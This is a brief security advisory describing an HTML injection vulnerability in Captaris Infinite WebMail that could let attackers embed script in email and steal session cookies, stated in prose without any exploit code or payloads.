An HTML injection vulnerability has been discovered in Captaris Infinite WebMail. Due to insufficient sanitization of HTML content, it is possible for an attacker to embed malicious script code into HTML email messages.

This may allow an attacker to steal cookie-based authentication credentials from users of the webmail system. Other attacks are also possible.
